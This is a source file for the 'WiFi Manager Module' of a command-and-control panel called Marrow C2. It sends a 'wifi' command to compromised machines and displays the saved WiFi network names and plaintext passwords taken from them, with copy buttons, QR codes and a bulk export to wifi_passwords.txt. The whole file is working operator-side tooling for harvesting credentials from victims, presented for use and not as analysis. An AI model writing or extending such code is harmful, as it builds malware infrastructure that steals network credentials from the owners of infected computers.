<?php
// Marrow C2 - WiFi Manager Module
// Network list with passwords, QR codes, and export
?>
<div id="wifi-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-3">
            <span class="text-white font-medium">📶 WiFi Networks</span>
            <span id="wifi-count" class="text-xs text-gray-500">0 networks</span>
        </div>
        <div class="flex items-center gap-2">
            <button onclick="WIFI.refresh()" class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm">
                🔄 Refresh
            </button>
            <button onclick="WIFI.exportAll()" class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm">
                📥 Export All
            </button>
        </div>
    </div>

    <!-- Network Grid -->
    <div id="wifi-grid" class="flex-1 overflow-auto p-4">
        <div class="text-center text-gray-500 py-12">
            <div class="text-4xl mb-4 opacity-50">📶</div>
            <p>Click "Refresh" to load saved WiFi networks</p>
        </div>
    </div>
</div>

<!-- QR Modal -->
<div id="wifi-qr-modal" class="fixed inset-0 bg-black/90 flex items-center justify-center z-50 hidden"
    onclick="WIFI.closeQR()">
    <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-8 text-center max-w-sm"
        onclick="event.stopPropagation()">
        <h3 id="wifi-qr-ssid" class="text-xl font-bold text-white mb-2"></h3>
        <p class="text-sm text-gray-400 mb-6">Scan to connect</p>
        <div class="bg-white p-4 rounded-xl inline-block mb-6">
            <canvas id="wifi-qr-canvas"></canvas>
        </div>
        <div class="space-y-3">
            <div class="bg-[#1a1f2e] rounded-xl p-4 text-left">
                <div class="text-xs text-gray-500 mb-1">Password</div>
                <div id="wifi-qr-pass" class="font-mono text-[#10b981] text-lg"></div>
            </div>
            <div class="flex gap-2">
                <button onclick="WIFI.copyPassword()"
                    class="flex-1 py-2.5 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-xl font-medium text-sm">
                    📋 Copy Password
                </button>
                <button onclick="WIFI.closeQR()"
                    class="flex-1 py-2.5 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl text-sm">
                    Close
                </button>
            </div>
        </div>
    </div>
</div>

<style>
    .wifi-card {
        background: linear-gradient(135deg, #0f1219 0%, #1a1f2e 100%);
        border: 1px solid #1e2433;
        border-radius: 16px;
        padding: 20px;
        transition: all 0.2s;
    }

    .wifi-card:hover {
        border-color: #6366f1;
        box-shadow: 0 4px 20px rgba(99, 102, 241, 0.15);
        transform: translateY(-2px);
    }

    .wifi-signal {
        display: flex;
        gap: 2px;
        align-items: flex-end;
    }

    .wifi-signal-bar {
        width: 4px;
        background: #333;
        border-radius: 2px;
    }

    .wifi-signal-bar.active {
        background: #10b981;
    }
</style>

<script>
    const WIFI = {
        networks: [],
        currentNetwork: null,

        refresh() {
            document.getElementById('wifi-grid').innerHTML = `
            <div class="text-center text-gray-500 py-12">
                <div class="animate-spin text-4xl mb-4">⏳</div>
                <p>Scanning networks...</p>
            </div>
        `;
            queueCommand('wifi');
        },

        render(data) {
            try {
                this.networks = JSON.parse(data);
                const grid = document.getElementById('wifi-grid');
                document.getElementById('wifi-count').textContent = `${this.networks.length} networks`;

                if (this.networks.length === 0) {
                    grid.innerHTML = `<div class="text-center text-gray-500 py-12">No saved networks found</div>`;
                    return;
                }

                grid.innerHTML = `
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                    ${this.networks.map((n, i) => `
                        <div class="wifi-card">
                            <div class="flex items-start justify-between mb-4">
                                <div class="flex items-center gap-3">
                                    <div class="w-12 h-12 bg-[#10b981]/20 rounded-xl flex items-center justify-center text-2xl">
                                        📶
                                    </div>
                                    <div>
                                        <div class="text-white font-semibold">${this.esc(n.ssid)}</div>
                                        <div class="text-xs text-gray-500">${n.auth || 'Unknown'}</div>
                                    </div>
                                </div>
                                <button onclick="WIFI.showQR(${i})" class="w-10 h-10 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg flex items-center justify-center text-lg" title="Show QR Code">
                                    📱
                                </button>
                            </div>
                            
                            <div class="bg-[#0a0f1a] rounded-xl p-3 mb-3">
                                <div class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Password</div>
                                <div class="font-mono text-[#10b981] ${n.password ? '' : 'text-gray-500'}">
                                    ${n.password || '[Open Network]'}
                                </div>
                            </div>
                            
                            <div class="flex items-center justify-between text-xs">
                                <span class="text-gray-500">${n.cipher || '-'}</span>
                                <div class="flex gap-2">
                                    <button onclick="WIFI.copy(${i})" class="px-3 py-1.5 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg">
                                        📋 Copy
                                    </button>
                                </div>
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
            } catch (e) {
                document.getElementById('wifi-grid').innerHTML = `<pre class="text-xs text-gray-400 p-4">${data}</pre>`;
            }
        },

        showQR(idx) {
            const n = this.networks[idx];
            this.currentNetwork = n;

            document.getElementById('wifi-qr-ssid').textContent = n.ssid;
            document.getElementById('wifi-qr-pass').textContent = n.password || '[Open]';
            document.getElementById('wifi-qr-modal').classList.remove('hidden');

            // Generate WiFi QR string
            const authType = n.auth && n.auth.includes('WPA') ? 'WPA' : (n.auth && n.auth.includes('WEP') ? 'WEP' : 'nopass');
            const wifiString = `WIFI:T:${authType};S:${n.ssid};P:${n.password || ''};;`;

            // Try QRCode library
            const canvas = document.getElementById('wifi-qr-canvas');
            if (typeof QRCode !== 'undefined' && QRCode.toCanvas) {
                QRCode.toCanvas(canvas, wifiString, {
                    width: 200,
                    margin: 2,
                    color: { dark: '#000000', light: '#ffffff' }
                }, (err) => { if (err) console.error(err); });
            } else {
                // Fallback - show the string
                canvas.style.display = 'none';
                const parent = canvas.parentElement;
                parent.innerHTML = `<div class="p-4 bg-gray-100 rounded-lg text-xs text-gray-800 font-mono break-all">${wifiString}</div>`;
            }
        },

        closeQR() {
            document.getElementById('wifi-qr-modal').classList.add('hidden');
        },

        copy(idx) {
            const n = this.networks[idx];
            navigator.clipboard.writeText(n.password || '');

            // Visual feedback
            const cards = document.querySelectorAll('.wifi-card');
            if (cards[idx]) {
                const origBg = cards[idx].style.borderColor;
                cards[idx].style.borderColor = '#10b981';
                setTimeout(() => cards[idx].style.borderColor = origBg, 500);
            }
        },

        copyPassword() {
            if (this.currentNetwork) {
                navigator.clipboard.writeText(this.currentNetwork.password || '');
            }
        },

        exportAll() {
            let text = 'WiFi Networks Export\n';
            text += '='.repeat(50) + '\n\n';

            this.networks.forEach(n => {
                text += `Network: ${n.ssid}\n`;
                text += `Password: ${n.password || '[Open]'}\n`;
                text += `Auth: ${n.auth || '-'}\n`;
                text += `Cipher: ${n.cipher || '-'}\n`;
                text += '-'.repeat(30) + '\n';
            });

            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'wifi_passwords.txt';
            a.click();
            URL.revokeObjectURL(url);
        },

        esc(s) {
            const d = document.createElement('div');
            d.textContent = s || '';
            return d.innerHTML;
        }
    };
</script>